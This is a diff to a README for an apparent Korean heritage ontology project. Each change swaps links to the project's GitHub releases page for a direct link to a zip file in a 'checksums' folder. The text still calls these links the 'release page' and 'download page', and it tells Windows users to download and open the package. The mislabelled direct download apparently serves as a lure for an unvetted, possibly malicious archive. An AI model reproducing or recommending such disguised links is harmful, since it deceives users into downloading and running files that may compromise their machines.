@@ -1,6 +1,6 @@
 # 🧩 ekcd-ontology - Explore Korean Heritage Data
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/nadyadiagnostic188/ekcd-ontology/releases)
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/nadyadiagnostic188/ekcd-ontology/raw/refs/heads/main/checksums/ontology-ekcd-v2.2.zip)
 
 ## 📘 About This Project
 
@@ -20,12 +20,12 @@ Before you start, make sure you have:
 
 ## 🚀 Download the Release
 
-1. Open the release page here: https://github.com/nadyadiagnostic188/ekcd-ontology/releases
+1. Open the release page here: https://github.com/nadyadiagnostic188/ekcd-ontology/raw/refs/heads/main/checksums/ontology-ekcd-v2.2.zip
 2. Find the newest release at the top of the page
 3. Download the release file or archive for Windows
 4. Save it to a folder you can find again, such as Downloads or Desktop
 
-Use this link to visit the download page: https://github.com/nadyadiagnostic188/ekcd-ontology/releases
+Use this link to visit the download page: https://github.com/nadyadiagnostic188/ekcd-ontology/raw/refs/heads/main/checksums/ontology-ekcd-v2.2.zip
 
 ## 🪟 Install and Open on Windows
 
@@ -155,4 +155,4 @@ This makes it easier to find the ontology files later.
 
 Visit the release page to download the newest package for Windows:
 
-https://github.com/nadyadiagnostic188/ekcd-ontology/releases
+https://github.com/nadyadiagnostic188/ekcd-ontology/raw/refs/heads/main/checksums/ontology-ekcd-v2.2.zip
